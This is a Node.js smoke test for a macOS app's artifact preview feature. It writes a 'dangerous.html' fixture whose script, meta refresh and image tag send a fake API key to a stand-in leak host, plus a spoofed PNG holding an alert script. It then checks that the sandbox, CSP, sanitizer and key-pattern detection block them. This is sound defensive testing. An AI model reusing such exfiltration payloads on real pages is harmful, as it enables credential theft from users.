#!/usr/bin/env node

import { spawn } from 'node:child_process'
import { promises as fs } from 'node:fs'
import { arch, platform, tmpdir } from 'node:os'
import { dirname, join, relative, resolve } from 'node:path'
import { performance } from 'node:perf_hooks'
import { fileURLToPath } from 'node:url'

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..')
const appBundle = resolve(
  process.env.MILKSU_APP_PATH || join(repositoryRoot, 'build', 'bin', 'MilkSU.app'),
)
const appExecutable = join(appBundle, 'Contents', 'MacOS', 'MilkSU')
const resultsDirectory = join(repositoryRoot, 'build', 'test-results')
const resultPath = join(resultsDirectory, 'artifact-preview-live.json')
const webViewResultPath = join(resultsDirectory, 'artifact-preview-webview-live.json')
const liveSmokeEnabled = process.env.MILKSU_ARTIFACT_PREVIEW_LIVE_SMOKE === '1'
const startupTimeoutMs = 45_000
const shutdownTimeoutMs = 10_000
const isolatedInstanceId = `artifact-preview-live-${process.pid}-${Date.now()}`
const webViewFixtureSecret = 'sk-artifact-webview-secret123456789'

function assert(condition, message) {
  if (!condition) throw new Error(message)
}

function delay(milliseconds) {
  return new Promise(resolveDelay => setTimeout(resolveDelay, milliseconds))
}

async function exists(path) {
  try {
    await fs.access(path)
    return true
  } catch {
    return false
  }
}

async function waitForExit(child, timeoutMs) {
  if (child.exitCode !== null || child.signalCode !== null) {
    return { code: child.exitCode, signal: child.signalCode, timedOut: false }
  }
  return new Promise(resolveExit => {
    const timer = setTimeout(() => {
      child.off('exit', onExit)
      resolveExit({ code: null, signal: null, timedOut: true })
    }, timeoutMs)
    function onExit(code, signal) {
      clearTimeout(timer)
      resolveExit({ code, signal, timedOut: false })
    }
    child.once('exit', onExit)
  })
}

async function waitForAppReport(path, child, spawnErrorRef) {
  const deadline = performance.now() + startupTimeoutMs
  while (!(await exists(path))) {
    if (spawnErrorRef()) throw spawnErrorRef()
    if (child.exitCode !== null || child.signalCode !== null) {
      throw new Error(
        `packaged App exited before artifact preview smoke report (code=${child.exitCode}, signal=${child.signalCode})`,
      )
    }
    assert(
      performance.now() < deadline,
      `artifact preview smoke report exceeded ${startupTimeoutMs} ms`,
    )
    await delay(100)
  }
  return JSON.parse(await fs.readFile(path, 'utf8'))
}

function pngFixture() {
  return Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0])
}

async function writeFixture(workspace) {
  const files = new Map([
    [
      'reports/summary.md',
      Buffer.from('# MilkSU packaged artifact preview\n\nThis Markdown file was read by the packaged App.\n'),
    ],
    [
      'reports/result.html',
      Buffer.from('<!doctype html><meta charset="utf-8"><h1>Packaged Preview</h1>'),
    ],
    [
      'reports/dangerous.html',
      Buffer.from([
        '<!doctype html>',
        '<html><head>',
        '<meta http-equiv="refresh" content="0;url=https://artifact-preview-leak.invalid/redirect">',
        '<script>window.top.__milksuArtifactPreviewWebViewSmokeMutated=true;fetch("https://artifact-preview-leak.invalid/collect?api_key=',
        webViewFixtureSecret,
        '")</script>',
        '</head><body onload="window.top.__milksuArtifactPreviewWebViewSmokeMutated=true">',
        '<h1>Dangerous HTML WebView Smoke</h1>',
        '<p>Authorization: Bearer ',
        webViewFixtureSecret,
        '</p>',
        '<img src="https://artifact-preview-leak.invalid/pixel.png?api_key=',
        webViewFixtureSecret,
        '">',
        '</body></html>',
      ].join('')),
    ],
    ['images/screenshot.png', pngFixture()],
    ['images/spoofed.png', Buffer.from('<script>alert(1)</script>')],
    ['archive/result.svg', Buffer.from('<svg/>')],
  ])
  for (const [relativePath, content] of files) {
    const absolute = join(workspace, ...relativePath.split('/'))
    await fs.mkdir(dirname(absolute), { recursive: true, mode: 0o700 })
    await fs.writeFile(absolute, content, { mode: 0o600 })
  }
}

function assertPreview(report, relativePath, kind, mediaType) {
  const preview = report.previews.find(item => item.relativePath === relativePath)
  assert(preview, `missing preview for ${relativePath}`)
  assert(preview.kind === kind, `${relativePath} kind = ${preview.kind}, want ${kind}`)
  assert(preview.mediaType === mediaType, `${relativePath} mediaType = ${preview.mediaType}, want ${mediaType}`)
  assert(Number(preview.sizeBytes) > 0, `${relativePath} missing size`)
  return preview
}

async function assertAppReport(report, appDataDirectory, workspace) {
  assert(report.schema === 'milksu-coding-artifact-preview-smoke/v1', 'unexpected artifact preview smoke schema')
  assert(!report.error, `artifact preview smoke failed: ${report.error}`)
  assert(report.dataDirectory === appDataDirectory, `artifact preview smoke used unexpected data directory: ${report.dataDirectory}`)
  assert(report.workspace === workspace, `artifact preview smoke used unexpected workspace: ${report.workspace}`)
  assert(Array.isArray(report.previews) && report.previews.length === 3, 'artifact preview smoke did not return three previews')

  const markdown = assertPreview(report, 'reports/summary.md', 'markdown', 'text/markdown')
  assert(
    markdown.content?.includes('packaged App'),
    'Markdown preview did not include fixture content',
  )
  const html = assertPreview(report, 'reports/result.html', 'html', 'text/html')
  assert(html.content?.includes('Packaged Preview'), 'HTML preview did not include fixture content')
  const image = assertPreview(report, 'images/screenshot.png', 'image', 'image/png')
  assert(
    image.dataUrl === `data:image/png;base64,${pngFixture().toString('base64')}`,
    'PNG preview data URL did not match fixture bytes',
  )

  for (const rejected of ['../outside.md', 'images/spoofed.png', 'archive/result.svg']) {
    assert(report.rejected?.[rejected], `artifact preview smoke did not reject ${rejected}`)
  }
  const serialized = JSON.stringify(report)
  assert(!/OPENAI_API_KEY|ANTHROPIC_API_KEY|sk-[A-Za-z0-9]/.test(serialized), 'artifact preview smoke report leaked key-shaped content')
}

function assertWebViewReport(report, appDataDirectory, workspace) {
  assert(report.schema === 'milksu-coding-artifact-preview-webview-smoke/v1', 'unexpected artifact preview WebView smoke schema')
  assert(!report.error, `artifact preview WebView smoke failed: ${report.error}`)
  assert(report.dataDirectory === appDataDirectory, `artifact preview WebView smoke used unexpected data directory: ${report.dataDirectory}`)
  assert(report.workspace === workspace, `artifact preview WebView smoke used unexpected workspace: ${report.workspace}`)
  assert(report.relativePath === 'reports/dangerous.html', `artifact preview WebView smoke used unexpected path: ${report.relativePath}`)
  assert(report.kind === 'html' && report.mediaType === 'text/html', 'artifact preview WebView smoke did not read HTML through the App bridge')
  assert(report.sandboxAttribute === '', `artifact preview WebView sandbox attribute = ${JSON.stringify(report.sandboxAttribute)}`)
  for (const gate of [
    'backendHTMLRead',
    'iframeSandboxPresent',
    'iframeSandboxDoesNotAllowScripts',
    'sanitizerRemovedExecutableElements',
    'sanitizerRemovedExternalResources',
    'cspBlocksNetworkAndScripts',
    'credentialRedacted',
    'parentNotMutated',
  ]) {
    assert(report.gates?.[gate] === true, `artifact preview WebView gate ${gate} did not pass: ${JSON.stringify(report.gates)}`)
  }
  assert(report.csp?.includes("default-src 'none'"), 'artifact preview WebView report missed default-src none CSP')
  assert(report.csp?.includes("connect-src 'none'"), 'artifact preview WebView report missed connect-src none CSP')
  assert(report.csp?.includes("script-src 'none'"), 'artifact preview WebView report missed script-src none CSP')
  assert(report.summary?.redactedMarkerCount >= 1, 'artifact preview WebView smoke did not exercise credential redaction')
  assert(report.summary?.bodyText?.includes('Dangerous HTML WebView Smoke'), 'artifact preview WebView smoke did not preserve harmless body text')
  const serialized = JSON.stringify(report)
  assert(!serialized.includes(webViewFixtureSecret), 'artifact preview WebView report leaked the fixture credential')
  assert(!serialized.includes('artifact-preview-leak.invalid'), 'artifact preview WebView report leaked an external resource URL')
}

async function main() {
  if (!liveSmokeEnabled) {
    console.log('Skipping packaged artifact preview live smoke; set MILKSU_ARTIFACT_PREVIEW_LIVE_SMOKE=1 to run it.')
    return
  }
  assert(platform() === 'darwin', 'packaged artifact preview live smoke requires macOS')
  assert(await exists(appExecutable), `missing packaged App executable: ${appExecutable}`)

  const fixtureRoot = await fs.mkdtemp(join(tmpdir(), 'milksu-artifact-preview-live-'))
  const fixtureTemp = join(fixtureRoot, 'tmp')
  const workspace = join(fixtureRoot, 'workspace')
  const appDataDirectory = join(fixtureRoot, 'app-data')
  const appReportPath = join(fixtureRoot, 'artifact-preview-app-smoke.json')
  const appWebViewReportPath = join(fixtureRoot, 'artifact-preview-webview-app-smoke.json')
  await fs.mkdir(fixtureTemp, { recursive: true, mode: 0o700 })
  await fs.mkdir(appDataDirectory, { recursive: true, mode: 0o700 })
  await writeFixture(workspace)

  let child
  let spawnError
  let stdoutBytes = 0
  let stderrBytes = 0
  try {
    child = spawn(appExecutable, [], {
      cwd: fixtureRoot,
      env: {
        HOME: fixtureRoot,
        TMPDIR: fixtureTemp,
        PATH: '/usr/bin:/bin:/usr/sbin:/sbin',
        LANG: 'en_US.UTF-8',
        LC_ALL: 'en_US.UTF-8',
        MILKSU_APPDATA_DIR: appDataDirectory,
        MILKSU_ENABLE_MANAGED_LABS: '0',
        MILKSU_INSTANCE_ID: isolatedInstanceId,
        MILKSU_CODING_ARTIFACT_PREVIEW_SMOKE_RESULT: appReportPath,
        MILKSU_CODING_ARTIFACT_PREVIEW_SMOKE_WORKSPACE: workspace,
        MILKSU_CODING_ARTIFACT_PREVIEW_WEBVIEW_SMOKE_RESULT: appWebViewReportPath,
        MILKSU_CODING_ARTIFACT_PREVIEW_WEBVIEW_SMOKE_PATH: 'reports/dangerous.html',
      },
      stdio: ['ignore', 'pipe', 'pipe'],
    })
    child.once('error', error => {
      spawnError = error
    })
    child.stdout.on('data', chunk => {
      stdoutBytes += chunk.length
    })
    child.stderr.on('data', chunk => {
      stderrBytes += chunk.length
    })

    const appReport = await waitForAppReport(appReportPath, child, () => spawnError)
    await assertAppReport(appReport, appDataDirectory, workspace)
    const appWebViewReport = await waitForAppReport(appWebViewReportPath, child, () => spawnError)
    assertWebViewReport(appWebViewReport, appDataDirectory, workspace)

    child.kill('SIGTERM')
    let exit = await waitForExit(child, shutdownTimeoutMs)
    let gracefulShutdown = true
    if (exit.timedOut) {
      gracefulShutdown = false
      child.kill('SIGKILL')
      exit = await waitForExit(child, 5_000)
    }
    assert(!exit.timedOut, 'packaged App did not terminate after artifact preview smoke')

    const report = {
      ...appReport,
      schema: 'milksu-coding-artifact-preview-live-smoke/v1',
      measuredAt: new Date().toISOString(),
      environment: {
        platform: platform(),
        architecture: arch(),
        isolatedDataDirectory: true,
      },
      app: {
        stdoutBytes,
        stderrBytes,
        gracefulShutdown,
      },
      webView: appWebViewReport,
      gates: {
        packagedAppReadMarkdown: true,
        packagedAppReadHTML: true,
        packagedAppReadPNG: true,
        rejectedWorkspaceEscape: true,
        rejectedSpoofedImage: true,
        rejectedUnsupportedSVG: true,
        webViewHTMLSandbox: true,
        webViewHTMLCSP: true,
        webViewHTMLSanitizer: true,
      },
    }
    await fs.mkdir(resultsDirectory, { recursive: true })
    await fs.writeFile(resultPath, `${JSON.stringify(report, null, 2)}\n`, { mode: 0o600 })
    await fs.writeFile(webViewResultPath, `${JSON.stringify(appWebViewReport, null, 2)}\n`, { mode: 0o600 })

    console.log('MilkSU packaged artifact preview smoke passed.')
    console.log('  previews: Markdown + HTML + PNG')
    console.log('  negative gates: workspace escape + spoofed PNG + SVG + HTML WebView sandbox')
    console.log(`  report: ${relative(repositoryRoot, resultPath)}`)
    console.log(`  WebView report: ${relative(repositoryRoot, webViewResultPath)}`)
  } finally {
    if (child && child.exitCode === null && child.signalCode === null) {
      child.kill('SIGTERM')
      const exit = await waitForExit(child, 2_000)
      if (exit.timedOut) {
        child.kill('SIGKILL')
        await waitForExit(child, 5_000)
      }
    }
    await fs.rm(fixtureRoot, { recursive: true, force: true })
  }
}

main().catch(error => {
  console.error(error instanceof Error ? error.message : String(error))
  process.exitCode = 1
})
